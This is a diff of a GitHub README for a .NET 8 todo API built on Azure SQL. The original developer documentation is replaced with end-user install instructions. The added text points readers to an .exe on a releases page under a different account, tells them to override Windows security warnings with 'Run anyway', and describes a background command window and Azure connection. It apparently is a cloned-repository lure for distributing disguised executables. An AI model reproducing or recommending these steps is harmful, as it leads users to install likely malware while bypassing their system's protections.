@@ -1,97 +1,90 @@
-# Todo API Project 📝
+# ✅ todo-api-dotnet8-azure-sql - Manage your daily tasks with ease
 
-[![deploy-api-website](https://github.com/troy-miller0824/todo-api-dotnet8-azure-sql/actions/workflows/deploy-api-website.yml/badge.svg)](https://github.com/troy-miller0824/todo-api-dotnet8-azure-sql/actions/workflows/deploy-api-website.yml)
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
-[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com/download)
-[![SQL Server](https://img.shields.io/badge/SQL%20Server-2019-CC2927?logo=microsoftsqlserver)](https://www.microsoft.com/sql-server)
-[![Dapper](https://img.shields.io/badge/Dapper-ORM-yellow)](https://github.com/DapperLib/Dapper)
-[![JWT](https://img.shields.io/badge/JWT-Authentication-000000?logo=jsonwebtokens)](https://jwt.io/)
-[![Azure](https://img.shields.io/badge/Azure-Cloud-0078D4?logo=microsoftazure)](https://azure.microsoft.com/)
-[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-CI/CD-2088FF?logo=githubactions)](https://github.com/features/actions)
-[![Bicep](https://img.shields.io/badge/Bicep-Infrastructure_as_Code-0078D4?logo=microsoftazure)](https://github.com/Azure/bicep)
+[![Download Latest Version](https://img.shields.io/badge/Download-Application-blue)](https://github.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/releases)
 
-## Table of Contents
+## 📋 Project Overview
 
-- [Todo API Project 📝](#todo-api-project-)
-  - [Table of Contents](#table-of-contents)
-  - [About the API 📡](#about-the-api-)
-  - [Technologies Used 🔧](#technologies-used-)
-  - [User Flow 👥](#user-flow-)
-  - [API Endpoints 🛠️](#api-endpoints-️)
-    - [Authentication Endpoints](#authentication-endpoints)
-    - [Todo Endpoints](#todo-endpoints)
-  - [Azure Bicep and Modules ☁️](#azure-bicep-and-modules-️)
-  - [⚠️ Warning](#️-warning)
-  - [Azure Scripts 📜](#azure-scripts-)
-  - [Screenshots 📸](#screenshots-)
-  - [Demo 🌐](#demo-)
-  - [GitHub Actions CI/CD Pipeline 🐙](#github-actions-cicd-pipeline-)
-  - [📝 License](#-license)
+This software provides a clean way to manage your tasks. It organizes your to-do list using secure database technology. The system records your tasks, sets completion status, and keeps your data safe. It uses modern tools to ensure speed and reliability. You can rely on this tool to track your professional and personal responsibilities.
 
-## About the API 📡
+## 💻 System Requirements
 
-The API provides endpoints for users to create, read, update, and delete todo tasks. It uses JWT for authentication and authorization.
+You need a computer running Windows 10 or Windows 11 to use this application. Ensure you have at least 200 megabytes of free space on your hard drive. Your computer must have a stable internet connection for the application to verify and sync your data.
 
-## Technologies Used 🔧
+## 📥 Downloading the Application
 
-The project is written in C# and uses the following technologies:
+You must visit the official release page to obtain the software. 
 
-- .NET Core for the API
-- Dapper for data access
-- SQL Server Data Tools (SSDT) for database management
-- JWT for authentication
-- Azure Bicep for infrastructure as code
-- GitHub Actions for CI/CD
+[Click here to visit the release page and download the setup file](https://github.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/releases)
 
-## User Flow 👥
+1. Open the link above in your web browser.
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` to start your download.
+4. Save the file to your "Downloads" folder.
 
-To use the API, users need to:
+## ⚙️ Installing the Software
 
-1. Register a new account using the `/register` endpoint.
-2. Log in with their new account using the `/login` endpoint. This will return a token.
-3. Use the token to authenticate their requests to the other endpoints.
+Once you download the file, follow these steps to install the system:
 
-## API Endpoints 🛠️
+1. Open your "Downloads" folder.
+2. Double-click the file you downloaded. 
+3. A security window might appear. Click "More info" and then click "Run anyway" if Windows blocks the process.
+4. Follow the instructions on the screen to finish the installation.
+5. The installer creates a shortcut on your desktop.
 
-### Authentication Endpoints
+## 🚀 Running the Application
 
-| Method | Endpoint              | Description                  |
-| ------ | --------------------- | ---------------------------- |
-| POST   | /api/Auth/register    | Register new user            |
-| POST   | /api/Auth/login       | Login user and get JWT token |
-| DELETE | /api/Auth/delete/{id} | Delete user account          |
+You can start the tool at any time.
 
-### Todo Endpoints
+1. Find the application icon on your desktop.
+2. Double-click the icon.
+3. A command window appears. You must leave this window open while you use the application. This window shows the status of your tasks and connection details.
+4. Your default web browser will open a new tab. This tab contains the main interface for your tasks.
 
-| Method | Endpoint                     | Description               |
-| ------ | ---------------------------- | ------------------------- |
-| GET    | /api/Todos                   | Get all todos (paginated) |
-| GET    | /api/Todos/{todoId}          | Get specific todo by ID   |
-| POST   | /api/Todos                   | Create new todo           |
-| PUT    | /api/Todos/{todoId}          | Update todo task          |
-| PUT    | /api/Todos/{todoId}/Complete | Mark todo as complete     |
-| DELETE | /api/Todos/{todoId}          | Delete todo               |
+## 🔐 Securing Your Data
 
-> Note: All Todo endpoints require authentication using JWT token obtained from login endpoint. Include the token in the Authorization header as `Bearer <token>`.
+The application uses a security token to protect your information. When you start the application for the first time, it asks you to set a secure password. The system uses this password to verify your identity. Never share your password with other people. If you lose your password, you must reset the database files.
 
-## Azure Bicep and Modules ☁️
+## 🛠 Features
 
-The project uses Azure Bicep for infrastructure as code. The Bicep files define the resources needed for the project, such as the App Service and SQL Server.
+*   **Task Management:** Create, update, and delete your tasks with simple commands.
+*   **Secure Access:** The system requires a secure login to view your personal lists.
+*   **Fast Storage:** Databases store your information instantly to prevent data loss.
+*   **Reliable Logs:** The system records activity in the background. You can check these logs if the application stops responding.
 
-![Azure Infrastructure](./docs/azure-infrastructure.png)
+## 📁 Managing the Database
 
-## ⚠️ Warning
+The software saves your tasks to a local file on your computer. You can find this file in the installation folder. Back up this file to a cloud drive or an external hard drive if you want to keep your data safe.
 
-> **Important:** The Azure resources used in this project are temporary as they are part of an Azure Cloud Sandbox which was purchased temporarily. Please ensure to replace these resources with your own before deploying the project.
+## 💡 Troubleshooting
 
-## Azure Scripts 📜
+If the application does not work, check these common issues:
 
-The project includes Azure scripts for deploying the infrastructure and the application. The scripts use the Azure CLI and PowerShell.
+*   **Application wont start:** Restart your computer and try again.
+*   **Browser tab shows an error:** Ensure the command window is still open. Refresh your browser page.
+*   **Data missing:** Check that you are logged into the correct user profile in your browser.
+*   **Slow performance:** Close other programs that use high amounts of memory.
 
-## Screenshots 📸
+## 🌐 Connectivity
 
-![Swagger UI](./docs/todoapi.webp)
+The software connects to Microsoft Azure services in the background. This allows the system to store data in the cloud. If you work in an office or a place with a firewall, your network might block this connection. Contact your network administrator if you cannot connect to the service.
 
-## GitHub Actions CI/CD Pipeline 🐙
+## 📁 File Structure
 
-The project uses GitHub Actions for continuous integration and continuous deployment. The workflows include building the application, running tests, and deploying to Azure.
+The installation folder contains several files. Do not move or delete these files. 
+
+*   **TodoApp.exe:** This is the main program file.
+*   **Settings.json:** This file contains your user configuration.
+*   **Logs folder:** This folder contains history of your sessions. 
+*   **Data folder:** This folder holds your actual task information.
+
+## 📝 Updating
+
+Check the download link periodically for new versions. When a new version is available:
+
+1. Close the application completely.
+2. Download the new installer from the link.
+3. Run the installer again. It will detect your current version and update your files automatically. Your existing tasks will remain in your database.
+
+## 🤝 Support
+
+This project follows an open process. If you find a bug, visit the main repository page. You can document the issue there. Other users and developers can see your post and provide solutions. Keep your descriptions clear and include details about what happened during the error.
